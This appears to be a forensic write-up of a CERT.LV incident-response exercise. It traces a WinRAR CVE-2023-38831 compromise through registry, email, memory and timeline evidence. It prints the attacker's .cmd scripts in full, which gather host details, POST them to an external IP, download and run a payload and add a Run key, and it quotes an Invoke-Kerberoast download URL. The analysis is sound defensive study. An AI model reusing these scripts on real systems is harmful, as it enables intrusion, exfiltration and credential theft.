---
title: cert.lv computer and ram investigation task
date: 2026-03-05 09:39:36
tags:
---

## Task details


Bauskā atrodas mazs uzņēmums. Tur strādā IT administrators - Lauris Bārda un darbinieks - K. Sniedziņš.
K. Sniedziņš (pēc senāka incidenta) 30/04/24 saņem jaunu datoru darba vajadzībām. Tajā pieejams viss nepieciešamais darbam, un viņš tajā dienā uzsāk darbu ar jaunu datoru.
02/05/24 ap pusdienlaiku K. Sniedziņš sūdzas par datora darbību (lēns, lec dīvaini logi) IT administratoram Laurim, kurš uzreiz saprot, ka ir noticis jauns incidents un izveido datora diska kopiju K. Sniedziņa datoram un sazinās ar CERT.LV.

Incidenta izmeklēšanas ietvaros ir nepieciešams noskaidrot:
1) Kā dators tika kompromitēts?
2) Kādas darbības datorā ir veicis uzbrucējs?
3) Vai ir notikusi datu noplūde?
4) Ko vajag darīt, lai incidents vairāk neatkārtotos?

Materiālu ar HDD kopiju var lejupielādēt šeit: https://dropit.cert.lv/index.php/s/dA2wJmmSA3b9RbQ

Kopsavilkums: Kādi secinājumi ir pēc incidenta izmeklēšanas beigās un kādas nākamās darbības ir jāveic uzņēmumam.



Atskaitē par uzdevumu risināšanu ir jāiekļauj:
- izmantoto skriptu izejas kodi (gan savi, gan internetā atrodamie. Internetā izmantotajiem skriptiem jānorāda, no kurienes tie tika lejupielādēti un, ja ir veiktas kādas modifikācijas, tad norādīt, kādas);
- programmas, kas tika izmantotas, to rezultātu secinājumi;
- ekrānšāviņš, kas parāda, Jūsuprāt, nozīmīgus atradumus;
- ieteikumi, kas ir jādara, lai novērstu atklāto nepilnību;
- timeline ar hronoloģisko notikuma gaitu (laiks, kas notika, pierādījuma *source*)


## Tools used in investigation

- **FlareVM** - [https://github.com/mandiant/flare-vm](https://github.com/mandiant/flare-vm)
- **Arsenal-Image-Mounter** - [https://arsenalrecon.com/products/arsenal-image-mounter](https://arsenalrecon.com/products/arsenal-image-mounter)
- **KAPE** - [https://www.kroll.com/en/insights/publications/cyber/kroll-artifact-parser-extractor-kape](https://www.kroll.com/en/insights/publications/cyber/kroll-artifact-parser-extractor-kape)
- **Registry Explorer** - [https://ericzimmerman.github.io/](https://ericzimmerman.github.io/)
- **Time Explorer** - [https://ericzimmerman.github.io/](https://ericzimmerman.github.io/)
- **Event Log Explorer** - [https://eventlogxp.com](https://eventlogxp.com/)
- **SysTools MBOX viewer** - [http://mboxviewer.com/](http://mboxviewer.com/)
- **Volatility**- [https://github.com/volatilityfoundation/volatility3](https://github.com/volatilityfoundation/volatility3)
- **PLASO** -  [https://github.com/log2timeline/plaso](https://github.com/log2timeline/plaso)

## Working with investigation data.

The computer and FlareVM were configured to use UTC time.

To begin the investigation, access to the file system was required. The image file was mounted in read-only mode using Arsenal Image Mounter.

For information extraction from the mounted image file, I used KAPE (Kroll Artifact Parser and Extractor).

To ensure KAPE was up to date, I ran the update process.

{% codeblock lang:bat %}
kape.exe --sync https://github.com/AndrewRathbun/KapeFiles/archive/refs/heads/master.zip
kape.exe --sync https://github.com/EricZimmerman/KapeFiles/archive/master.zip
{% endcodeblock %}

{% codeblock lang:bat %}
.\kape.exe --tsource D: --tdest C:\evidence --tflush --target Avast,ClipboardMaster,MicrosoftOneNote,OneDrive_UserFiles,Session,Edge,Firefox,InternetExplorer,!BasicCollection,!SANS_Triage,Antivirus,CombinedLogs,KapeTriage,ProgramExecution,RegistryHives,WebBrowsers,ApacheAccessLog,PowerShellConsole,$LogFile,$MFT,ApplicationEvents,CertUtil,EventLogs,HostsFile,Prefetch,RDPLogs,RegistryHivesUser,RoamingProfile,ScheduledTasks,StartupFolders,Syscache,UsersFolders,WER,WindowsFirewall,WindowsIndexSearch 
{% endcodeblock %}

## Registry

For the registry investigation, I used Registry Explorer to load hives files and used built-in bookmarks for efficient navigation and analysis.

![Screenshot](image.png)

**System Information**

Computer name: **DZIMTENE24**
Registry: HKLM\System\CurrentControlSet\Control\Computer name\

Windows Version: **Windows 10 PRO 21H2**
Registry: HKLM\Software\Microsoft\Windows NT\Current version\

```
ProductName               Windows 10 Pro
ReleaseID                 2009
BuildLab                  22000.co_release.210604-1628
BuildLabEx                22000.1.amd64fre.co_release.210604-1628
CompositionEditionID      Enterprise
InstallDate               2024-04-29 09:24:59Z
InstallTime               2024-04-29 09:24:59Z 
```

Time zone: **UTC**

Registry: HKLM\System\CurrentControlSet\Control\TimeZoneInformation\

**Network Information** in Registry: HKLM\System\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\

```
Adapter: {7d266b6d-a545-462b-8c87-0619fce499e6} 
LastWrite Time: 2024-05-02 10:03:47Z
  EnableDHCP                   1                   
  Domain                                           
  NameServer                   10.0.0.6            
  DhcpIPAddress                10.0.0.12           
  DhcpSubnetMask               255.255.255.0       
  DhcpServer                   168.63.129.16       
  Lease                        4294967295          
  LeaseObtainedTime            2024-05-02 10:03:47Z
  T1                           2041-05-07 04:52:17Z
  T2                           2041-05-07 04:52:18Z
  LeaseTerminatesTime          2092-05-20 13:17:49Z   
  DhcpDomain                   k5l203rm4utudlsrlq4pja2u4a.gvxx.internal.cloudapp.net
  DhcpNameServer               168.63.129.16       
  DhcpDefaultGateway           10.0.0.1            
  DhcpSubnetMaskOpt            255.255.255.0  
```

```
Z:\Tools\RegRipper4.0>rip.exe -r C:\CERT\E\Windows\System32\config\SOFTWARE -p networklist
Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles
Network
  Key LastWrite    : 2024-04-29 09:24:26Z
  DateLastConnected: 2024-04-29 09:24:26
  DateCreated      : 2024-04-29 09:24:26
  DefaultGatewayMac: 12-34-56-78-9A-BC
  Type             : wired
IR-lab.local
  Key LastWrite    : 2024-05-02 10:03:51Z
  DateLastConnected: 2024-05-02 10:03:51
  DateCreated      : 2024-04-29 09:31:54
  DefaultGatewayMac: 12-34-56-78-9A-BC
  Type             : wired

```

Shutdown time: **2024-05-02 11:43:13**

Registry: HKLM\System\ControlSet001\Control\Windows\ShutdownTime

```
Z:\Tools\RegRipper4.0>rip.exe -r C:\CERT\E\Windows\System32\config\SYSTEM -p shutdown
Launching shutdown v.20201005
(System) Gets ShutdownTime value from System hive

ControlSet001\Control\Windows key, ShutdownTime value
LastWrite time: 2024-05-02 11:43:13Z
ShutdownTime  : 2024-05-02 11:43:13Z
```

Defender settings: **Disabled**

Registry: HKLM\Software\Microsoft\Windows Defender\

```
Z:\Tools\RegRipper4.0>rip.exe -r C:\CERT\E\Windows\System32\config\SOFTWARE -p defender
Launching defender v.20211027
defender v.20211027
(software) Get Windows Defender settings
MITRE: T1562.001 (defense evasion)
Microsoft\Windows Defender
LastWrite Time 2024-05-02 11:43:09Z
TamperProtection value = 4
If TamperProtection value = 1, it's disabled
Key path: Microsoft\Windows Defender
LastWrite time: 2024-05-02 11:43:09
Key path: Microsoft\Windows Defender\Real-Time Protection
LastWrite Time: 2024-05-02 06:26:36Z
DisableRealtimeMonitoring value = 1

Key path: Microsoft\Windows Defender\Windows Defender Exploit Guard
LastWrite Time: 2024-05-02 06:26:36Z
"Controlled Folder Access" value not found
Key path: Policies\Microsoft\Windows Defender
LastWrite time: 2024-04-29 09:52:32
Key path: Policies\Microsoft\Windows Defender\Real-Time Protection
LastWrite Time: 2024-04-29 09:52:31Z
DisableRealtimeMonitoring value = 1
```

Information about recently accessed documents was retrieved from the registry.

```
Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
LastWrite Time: 2024-05-02 10:04:44Z
  1 = The Internet
  0 = system-initiated
  22 = Untitled 1.docx
  24 = kontakti.png
  23 = kontakti.rar
  15 = 20150427215424-31241_jpg660x500.jpg
  20 = nelasit ja neesi es.doc
  19 = Atlūguma paraugs _ Iesniegums par atbrīvošanu no darba [2023] _ Padomi.html
  18 = The-Holy-Bible-King-James-Version.pdf
  17 = 2a2O1Gccb1.pdf
  16 = microsoft.com&form=B00032&ocid=SettingsHAQ-BingIA&mkt=en-US
  6 = atskaite-ksniedzins.docx
  10 = namejs projekts 2025
  14 = SS.LV Motocikli - BMW, Cena 4 500 €. Pārdodu BMW G 310Gs teicamā tehniskā 28Nm Bākas Derīga izpūtējs - Sludinājumi.pdf
  13 = projveidlaizpild_metodika.pdf
  12 = This PC
  11 = Documents
  9 = Downloads
  8 = latvian-entry-form-2023.docx
  7 = ieteikumi.txt
  5 = atskaite.docx
  4 = kglcheck/
  3 = programs (\\AD1)
  2 = test.txt
```

```
Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.com&form=B00032&ocid=SettingsHAQ-BingIA&mkt=en-US
LastWrite Time 2024-04-30 12:28:36Z
  0 = microsoft.com&form=B00032&ocid=SettingsHAQ-BingIA&mkt=en-US

Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.doc
LastWrite Time 2024-04-30 12:48:29Z
  0 = nelasit ja neesi es.doc

Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.docx
LastWrite Time 2024-05-02 10:03:26Z
MRUListEx = 3,1,2,0
  3 = Untitled 1.docx
  1 = atskaite-ksniedzins.docx
  2 = latvian-entry-form-2023.docx
  0 = atskaite.docx

Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.html
LastWrite Time 2024-04-30 12:44:42Z
  0 = Atlūguma paraugs _ Iesniegums par atbrīvošanu no darba [2023] _ Padomi.html

Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.jpg
LastWrite Time 2024-04-30 12:52:12Z
  0 = 20150427215424-31241_jpg660x500.jpg

Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.pdf
LastWrite Time 2024-04-30 12:42:21Z
MRUListEx = 3,2,1,0
  3 = The-Holy-Bible-King-James-Version.pdf
  2 = 2a2O1Gccb1.pdf
  1 = SS.LV Motocikli - BMW, Cena 4 500 €. Pārdodu BMW G 310Gs teicamā tehniskā 28Nm Bākas Derīga izpūtējs - Sludinājumi.pdf
  0 = projveidlaizpild_metodika.pdf

Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.png
LastWrite Time 2024-05-02 09:55:51Z
  0 = kontakti.png

Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.rar
LastWrite Time 2024-05-02 09:49:50Z
  0 = kontakti.rar

Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.txt
LastWrite Time 2024-04-30 08:57:32Z
MRUListEx = 1,0
  1 = ieteikumi.txt
  0 = test.txt

Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\Folder
LastWrite Time 2024-05-02 10:04:44Z
MRUListEx = 0,4,3,2,1
  0 = The Internet
  4 = namejs projekts 2025
  3 = This PC
  2 = Downloads
  1 = programs (\\AD1)
```

Recently accessed files by employee K. Sniedziņš

```bash
{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}
2024-05-02 10:27:17Z
  F8D0F44349C58912 (4)
2024-05-02 09:57:07Z   Microsoft.Windows.Explorer (22)
2024-05-02 09:50:09Z   Microsoft.Windows.Photos_8wekyb3d8bbwe!App (3)
2024-05-02 09:49:57Z   {6D809377-6AF0-444B-8957-A3773F02200E}\WinRAR\WinRAR.exe (1)
2024-05-02 09:32:28Z   TheDocumentFoundation.LibreOffice.Writer (3)
2024-05-01 08:33:03Z   MSEdge (5)
2024-04-30 12:45:24Z   TheDocumentFoundation.LibreOffice.Startcenter (2)
2024-04-30 12:45:15Z   {6D809377-6AF0-444B-8957-A3773F02200E}\Windows NT\Accessories\wordpad.exe (1)
2024-04-30 11:23:03Z   C:\Users\ksniedzins\Downloads\Evony_2lklAalPL50.exe (1)
2024-04-30 10:01:39Z   MicrosoftTeams_8wekyb3d8bbwe!MicrosoftTeams (2)
2024-04-30 08:57:35Z   Microsoft.WindowsNotepad_8wekyb3d8bbwe!App (10)
2024-04-29 11:44:06Z   \\AD1\programs\ikdienas darbam\Thunderbird Setup 115.10.1.exe (2)
2024-04-29 11:22:02Z   \\AD1\programs\ikdienas darbam\winrar-x64-622.exe (1)
2024-04-29 11:20:27Z   {1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\msiexec.exe (1)
2024-04-29 11:19:18Z   \\AD1\programs\ikdienas darbam\eparakstitajs3-bundle-1.7.4.exe (1)
2024-04-29 11:18:32Z   \\AD1\programs\ikdienas darbam\ccsetup623.exe (1)
2024-04-29 10:03:52Z   Microsoft.SecHealthUI_8wekyb3d8bbwe!SecHealthUI (6)
2024-04-29 10:03:44Z   windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel (6)
2024-04-29 09:53:58Z   Microsoft.XboxGamingOverlay_8wekyb3d8bbwe!App (1)
2024-04-29 09:52:25Z   {1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\cmd.exe (4)
2024-04-29 09:32:18Z   Microsoft.Getstarted_8wekyb3d8bbwe!App (14)
```

## Registry entries of Startup

The registry entry - **eParakstsUpdate - C:\Users\ksniedzins\Downloads\eparaksts.exe** has been identified as malware. It is configured to persist on the system through registry entries in the Startup section, allowing it to execute automatically when the computer starts.


```
Software\Microsoft\Windows\CurrentVersion\Run
LastWrite Time 2024-05-02 11:42:25Z
  docupdate - C:\Users\ksniedzins\Documents\docupdate.exe
  AvastBrowserAutoLaunch_D4D769E31B32C0F885979BAD1EB5E0BD - "C:\Users\ksniedzins\AppData\Local\AVAST Software\Browser\Application\AvastBrowser.exe" --auto-launch-at-startup --check-run=src=logon --profile-directory=Default --restore-last-session
  MicrosoftEdgeAutoLaunch_E1255F5260F5D03EED0A6564F9B3DFAF - "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --no-startup-window --win-session-start
  Free Download Manager - "C:\Users\ksniedzins\AppData\Local\Softdeluxe\Free Download Manager\fdm.exe" --hidden
  OneDrive - "C:\Users\ksniedzins\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
  eParakstsUpdate - C:\Users\ksniedzins\Downloads\eparaksts.exe
  Avast Browser - C:\Users\ksniedzins\AppData\Local\AVAST Software\Browser\Update\1.8.1697.6\AvastBrowserUpdateCore.exe
```

## Users, Groups and User Profiles

Active accounts during the attack timeframe - ksniedzins, AD-admin

Account were created but looks like used for FTK Imager- admin_local-xbsdk

![Screenshot](image1.png)

## PowerShell scripts

Time ago before system was infected with malware there was changes PowerShell settings to unrestricted!

![screenshot](image2.png)


![Screenshot3](image_3.png)


Found in the events PowerShell script up.ps1

```
C:\Users\ksniedzins\AppData\Local\Temp\up.ps1 
```

PowerShell script blocked by system.

PSReflect is a library that enables PowerShell to access win32 API functions in an uncomplicated way. It also helps to
create enums and structs easily—all without touching the disk.


## Thunderbird emails investigation

In KAPE extracted files I found some email files leftovers.

```powershell
 C:\evidence\G\Users\ksniedzins\AppData\Local\Thunderbird\Profiles\k65myo7h.default-release\cache2\entries`
```

I used software SysTools MBOX Viewer to look in messages.

![image_4.png](image_4.png)

Found 3 messages with attachments. Emails sent from:

- Lauris Barda - [lauris1887@yahoo.com](mailto:lauris1887@yahoo.com) with attachment **kontakti.rar**
- Ginc - [ginc@inbox.lv](mailto:ginc@inbox.lv) with attachment **vasaras_brivdienas.rar**

![image_5.png](image_5.png)

This email attachment kontakti.rar employee Sniedzins opened.

![image_6.png](image_6.png)

![image_7.png](image_7.png)

![image_8.png](image_8.png)

## System entry point

In the emails attachment I found *.bat scripts exploiting **CVE-2023-38831: WinRAR – Decompression or Arbitrary Code Execution **vulnerability - [https://www.cve.org/CVERecord?id=CVE-2023-38831](https://www.cve.org/CVERecord?id=CVE-2023-38831)

This vulnerability is exploited when WinRAR is used to extract a ZIP archive containing both a benign file and a folder sharing the same name as the benign file. When attempting to access the benign file, WinRAR inadvertently executes the file present within the folder. Threat actors can exploit this vulnerability by including malicious files inside a folder with the same name as a benign file. As a result, when the user, accesses the benign file, the malicious file gets executed leading to code execution.

**Affected WinRAR Versions:** 6.22 and other earlier versions.

In archive Windows Command Prompt script.

<!-- Column 1 -->
![image_9.png](image_9.png)

<!-- Column 2 -->
![image_10.png](image_10.png)

<!-- Column 1 -->
![image_11.png](image_11.png)

<!-- Column 2 -->
![image_12.png](image_12.png)

The script `vasaras_brivdienas.png.cmd`, contained within the archive `vasaras_brivdienas.rar`, was not executed.

```cmd
@echo off
"%ProgramFiles%\WinRAR\WinRar.exe" e -ibck "vasaras_brivdienas.rar" *.* %TEMP%\
powershell -c "whoami" >>  %TEMP%\info.txt
"%TEMP%\cmds.png"
ipconfig /all  >>  %TEMP%\info.txt
echo  %USERDOMAIN% \  >>  %TEMP%\info.txt
echo %USERDOMAIN%  >>  %TEMP%\info.txt
echo %USERDNSDOMAIN%  >>  %TEMP%\info.txt
gpresult /V >>  %TEMP%\info.txt
wmic group list /format:list >>  %TEMP%\info.txt
curl -X POST -F "file=@%TEMP%\info.txt" http://159.65.203.106:443
curl -X GET http://159.65.203.106:799/a.exe --output %TEMP%\calculator.exe
%TEMP%\calculator.exe
del "%TEMP%\info.txt"
del "%TEMP%\cmds.png .cmd"
```


The script `kontakti.png.cmd`, contained within the archive file `kontakti.rar`, was executed upon extraction of the archive.

```cmd
@echo off
"%ProgramFiles%\WinRAR\WinRar.exe" e -ibck "kontakti.rar" *.* %TEMP%\
powershell -c "whoami" >>  %TEMP%\info.txt
"%TEMP%\kontakti.png"
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "eParakstsUpdate" /t REG_SZ /d "%USERPROFILE%\Downloads\eparaksts.exe" /f
ipconfig /all  >>  %TEMP%\info.txt
echo  %USERDOMAIN% \  >>  %TEMP%\info.txt
echo %USERDOMAIN%  >>  %TEMP%\info.txt
echo %USERDNSDOMAIN%  >>  %TEMP%\info.txt
gpresult /V >>  %TEMP%\info.txt
wmic group list /format:list >>  %TEMP%\info.txt
curl -X POST -F "file=@%TEMP%\info.txt" http://159.65.203.106:443
curl -X GET http://159.65.203.106:799/a.exe --output "%USERPROFILE%\Downloads\eparaksts.exe"
"%USERPROFILE%\Downloads\eparaksts.exe"
del "%TEMP%\info.txt"
del "%TEMP%\cmds.png .cmd" 
del "%TEMP%\cmds.png"
```

Extraction time of the `kontakti.rar` archive.

```cmd
Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.rar
LastWrite Time 2024-05-02 09:49:50Z
MRUListEx = 0
  0 = kontakti.rar
```

Script `kontakti.png.cmd` actions taken on computer `DZIMTENE24`:

- Retrieves login name using `powershell -c "whoami"`
- Adds registry key for eparaksts.exe to run at logon: `reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "eParakstsUpdate" /t REG_SZ /d "%USERPROFILE%\Downloads\eparaksts.exe" /f`
- Gathers network configuration with `ipconfig /all`
- Obtains computer and domain names: `echo %USERDOMAIN%\`
- Collects group policy results using `gpresult /V`
- Lists computer accounts and groups: `wmic group list`
- Sends collected information to attacker's command and control server: `curl -X POST -F "file=@%TEMP%\info.txt" http://159.65.203.106:443`
- Downloads a reverse shell: `curl -X GET http://159.65.203.106:799/a.exe --output "%USERPROFILE%\Downloads\eparaksts.exe"`
- Attempts to clean up by deleting collected information and exploit files (unsuccessful)

This part of script not executed and that's way we can find file info.txt in  `ksniedzins\AppData\Local\Temp` folder

```cmd
del "%TEMP%\info.txt"
del "%TEMP%\cmds.png .cmd" 
del "%TEMP%\cmds.png"
```

**info.txt** and script files remained in the temp folder.

![image_13.png](image_13.png)


Checking the SHA-256 hash of `eparaksts.exe` on [VirusTotal](https://www.virustotal.com/gui/file/5333b1be6cca371b2ab54f5e61a2c5e07d338f47b9be939142918c6da0d5ab26/details)

![image 14.png](image_14.png)

MITRE ATT&CK® Tactics and Techniques used:

- [Persistence](https://www.virustotal.com/gui/search/attack_tactic%253ATA0003) - TA0003
- [Privilege Escalation](https://www.virustotal.com/gui/search/attack_tactic%253ATA0004) - TA0004
- [Defense Evasion](https://www.virustotal.com/gui/search/attack_tactic%253ATA0005) - TA0005
- [Credential Access](https://www.virustotal.com/gui/search/attack_tactic%253ATA0006) - TA0006
- [Discovery](https://www.virustotal.com/gui/search/attack_tactic%253ATA0007) - TA0007
- [Collection](https://www.virustotal.com/gui/search/attack_tactic%253ATA0009) - TA0009
- [Command and Control](https://www.virustotal.com/gui/search/attack_tactic%253ATA0011) - TA0011



Checks employee account privileges in system.

![image 15.png](image_15.png)

Malicious process `eparaksts.exe` running in memory with `PID 9808`

```cmd
C:\volatility3>python vol.py -f z:\ksniedzins-memdump.mem windows.pstree.PsTree

9808	6720	eparaksts.exe	2	-	2	True	2024-05-02 10:04:39.000000 UTC	N/A	\Device\HarddiskVolume4\Users\ksniedzins\Downloads\eparaksts.exe	"C:\Users\ksniedzins\Downloads\eparaksts.exe" 	C:\Users\ksniedzins\Downloads\eparaksts.exe
10580	9808	cmd.exe	1	-	2	True	2024-05-02 10:05:08.000000 UTC	N/A	\Device\HarddiskVolume4\Windows\SysWOW64\cmd.exe	C:\Windows\system32\cmd.exe	C:\Windows\SysWOW64\cmd.exe
3108	10580	conhost.exe	3	-	2	False	2024-05-02 10:05:08.000000 UTC	N/A	\Device\HarddiskVolume4\Windows\System32\conhost.exe	\??\C:\Windows\system32\conhost.exe 0x4	C:\Windows\system32\conhost.exe
```


Connection from malware `eparaksts.exe` established to IP address `159.65.203.106` **at time** -` 2024-05-02 10:04:39`

```cmd
C:\volatility3>python vol.py -f z:\ksniedzins-memdump.mem windows.netstat.NetStat
Volatility 3 Framework 2.11.0
Progress:  100.00               PDB scanning finished
Proto   LocalAddr       LocalPort       ForeignAddr     ForeignPort     State   PID     Owner   Created

TCPv4   10.0.0.12       49813   168.63.129.16   80      ESTABLISHED     3212    WindowsAzureGu  2024-05-02 10:04:12.000000 UTC
TCPv4   10.0.0.12       49922   100.20.238.229  443     ESTABLISHED     10120   AvastBrowser.e  2024-05-02 10:05:04.000000 UTC
TCPv4   10.0.0.12       49850   159.65.203.106  80      ESTABLISHED     9808    eparaksts.exe   2024-05-02 10:04:39.000000 UTC
TCPv4   10.0.0.12       49950   104.26.15.184   443     ESTABLISHED     10120   AvastBrowser.e  2024-05-02 10:05:30.000000 UTC
TCPv4   10.0.0.12       51077   34.110.186.80   443     ESTABLISHED     10120   AvastBrowser.e  2024-05-02 11:20:44.000000 UTC
TCPv4   10.0.0.12       49890   104.18.17.211   443     ESTABLISHED     10
```

Malware `eparaksts.exe` access wrights to the system.

```cmd
C:\volatility3>python vol.py -f z:\ksniedzins-memdump.mem windows.privileges.Privs --pid 9808 
PID	Process	Value	Privilege	Attributes	Description
9808	eparaksts.exe	2	SeCreateTokenPrivilege		Create a token object
9808	eparaksts.exe	3	SeAssignPrimaryTokenPrivilege		Replace a process-level token
9808	eparaksts.exe	4	SeLockMemoryPrivilege		Lock pages in memory
9808	eparaksts.exe	5	SeIncreaseQuotaPrivilege		Increase quotas
9808	eparaksts.exe	6	SeMachineAccountPrivilege		Add workstations to the domain
9808	eparaksts.exe	7	SeTcbPrivilege		Act as part of the operating system
9808	eparaksts.exe	8	SeSecurityPrivilege		Manage auditing and security log
9808	eparaksts.exe	9	SeTakeOwnershipPrivilege		Take ownership of files/objects
9808	eparaksts.exe	10	SeLoadDriverPrivilege		Load and unload device drivers
9808	eparaksts.exe	11	SeSystemProfilePrivilege		Profile system performance
9808	eparaksts.exe	12	SeSystemtimePrivilege		Change the system time
9808	eparaksts.exe	13	SeProfileSingleProcessPrivilege		Profile a single process
9808	eparaksts.exe	14	SeIncreaseBasePriorityPrivilege		Increase scheduling priority
9808	eparaksts.exe	15	SeCreatePagefilePrivilege		Create a pagefile
9808	eparaksts.exe	16	SeCreatePermanentPrivilege		Create permanent shared objects
9808	eparaksts.exe	17	SeBackupPrivilege		Backup files and directories
9808	eparaksts.exe	18	SeRestorePrivilege		Restore files and directories
9808	eparaksts.exe	19	SeShutdownPrivilege	Present	Shut down the system
9808	eparaksts.exe	20	SeDebugPrivilege		Debug programs
9808	eparaksts.exe	21	SeAuditPrivilege		Generate security audits
9808	eparaksts.exe	22	SeSystemEnvironmentPrivilege		Edit firmware environment values
9808	eparaksts.exe	23	SeChangeNotifyPrivilege	Present,Enabled,Default	Receive notifications of changes to files or directories
9808	eparaksts.exe	24	SeRemoteShutdownPrivilege		Force shutdown from a remote system
9808	eparaksts.exe	25	SeUndockPrivilege	Present	Remove computer from docking station
9808	eparaksts.exe	26	SeSyncAgentPrivilege		Synch directory service data
9808	eparaksts.exe	27	SeEnableDelegationPrivilege		Enable user accounts to be trusted for delegation
9808	eparaksts.exe	28	SeManageVolumePrivilege		Manage the files on a volume
9808	eparaksts.exe	29	SeImpersonatePrivilege		Impersonate a client after authentication
9808	eparaksts.exe	30	SeCreateGlobalPrivilege		Create global objects
9808	eparaksts.exe	31	SeTrustedCredManAccessPrivilege		Access Credential Manager as a trusted caller
9808	eparaksts.exe	32	SeRelabelPrivilege		Modify the mandatory integrity level of an object
9808	eparaksts.exe	33	SeIncreaseWorkingSetPrivilege	Present	Allocate more memory for user applications
9808	eparaksts.exe	34	SeTimeZonePrivilege	Present	Adjust the time zone of the computer's internal clock
9808	eparaksts.exe	35	SeCreateSymbolicLinkPrivilege		Required to create a symbolic link
9808	eparaksts.exe	36	SeDelegateSessionUserImpersonatePrivilege		Obtain an impersonation token for another user in the same session

```

## Creating a PLASO Timeline

Converted DZIMTENE24 image from VHD format to RAW.

```bash
qemu-img convert -O raw /mnt/c/CERT/ksniedzins-img/DZIMTENE24.vhd /mnt/e/image/disk.raw
```

Created a PLASO timeline file from the disk's RAW image.

```bash
/mnt/c/CERT/timeline# log2timeline.py --storage-file disk.plaso /mnt/e/image/disk.raw
```

Extracted Timeline Data from a Memory Dump using the timeliner plugin in Volatility.

```bash
/mnt/c/CERT/timeline# vol -f /mnt/c/CERT/ksniedzins-memdump.mem timeliner --create-bodyfile
```


Extracted Timeline Data from a Memory Dump timeline file using the mactime parser.

```bash
log2timeline.py --parser=mactime --storage-file=disk.plaso2 volatility.body
```

Sorted and exported Timeline Data as a CSV File.

```bash
psort.py -o l2tcsv -w timeline.csv disk.plaso2 "date > 2024-05-01 00:00:00"
```

## Timeline evidences

Winrar extracted and executed script `kontakti.png .cmd`

![image 16.png](image_16.png)



Script `kontakti.png .cmd` created a file `info.txt`

![image 17.png](image_17.png)

Script `kontakti.png .cmd` began gathering information about the computer.

![image 18.png](image_18.png)

The malware added an entry to the registry, ensuring its persistence on the system

![image 19.png](image_19.png)



Script collecting information about system.

![image 20.png](image_20.png)

Gathering information about system.

![image 21.png](image_21.png)

Gathering information about system.

![image 22.png](image_22.png)

Downloading the malware file "`eparaksts.exe`" to the employee's computer and executing it.

![image 23.png](image_23.png)

Downloaded PowerShell script `up.ps1`

![image 24.png](image_24.png)


PowerShell script `up.ps1` executed.

![image 25.png](image_25.png)

A PowerShell script downloaded from GitHub script Invoke-Kerberoast that's commonly is used to [Steal or Forge Kerberos Tickets, Technique T1558 - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/T1558)

[`https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1`](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1)

![c2153dcc-c834-44a9-84ad-acb85087a0b9.png](c2153dcc-c834-44a9-84ad-acb85087a0b9.png)

The file `disk-space.exe` was replaced with a malicious version.

![image 26.png](image_26.png)



Checking the SHA-256 hash of `disk-space.exe` on [VirusTotal](https://www.virustotal.com/gui/file/f4ca6ab465d5f41a861d49b34fba77a575b7806a30d87bced9fedef5d722b87e)

![image 27.png](image_27.png)


The scheduled task `\disk space logging` was configured to run with `disk-space.exe` as its argument.

```xml
 </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Users\Public\admin\disk-space.exe</Command>
      <WorkingDirectory>C:\Users\Public\admin</WorkingDirectory>
    </Exec>
    <Exec>
      <Command>robocopy</Command>
      <Arguments>\\ad1\programs c:\Users\Public\admin disk-space.exe r:1 w:1</Arguments>
    </Exec>
  </Actions>
</Task>
```



The scheduled task `\disk space logging` associated with `disk-space.exe` was active in memory.

```bash
python vol.py -f z:\ksniedzins-memdump.mem windows.pstree.PsTree --pid 6100

*** 6100	2348	Robocopy.exe	0xd40ff3898080	1	-	0	False	2024-05-02 10:05:23.000000 UTC	N/A	\Device\HarddiskVolume4\Windows\System32\Robocopy.exe	"C:\Windows\system32\robocopy.EXE" \\ad1\programs c:\Users\Public\admin disk-space.exe r:1 w:1	
```

```bash
python vol.py -f z:\ksniedzins-memdump.mem windows.cmdline.CmdLine --pid 6100
Volatility 3 Framework 2.11.0

6100    Robocopy.exe    "C:\Windows\system32\robocopy.EXE" \\ad1\programs c:\Users\Public\admin disk-space.exe r:1 w:1
```

Downloaded malware file to `C:\Users\ksniedzins\Documents\docupdate.exe`

![image 28.png](image_28.png)

![image 29.png](image_29.png)



Created files `asd.log atskaite-ksniedzins.docx atskaite.docx Untitled 1.docx` Malware `DOCUPDATE.EXE` was executed.

![image 30.png](image_30.png)

Retrieves login name using `powershell -c "whoami”`

![image 31.png](image_31.png)

Downloaded and executed script [`https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1`](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1)

![a3669a2c-d2c6-48ce-ae07-59782b23f5e4.png](a3669a2c-d2c6-48ce-ae07-59782b23f5e4.png)

Created file `C:\Users\AD_admin\Desktop\haxed.txt`

![image 32.png](image_32.png)


## Technical Timeline



| **Time**                  | **Activity** |
|---------------------------|--------------|
| 02/05/2024 9:32:04        | Received email in mailbox karlis.sniedzins@inbox.lv |
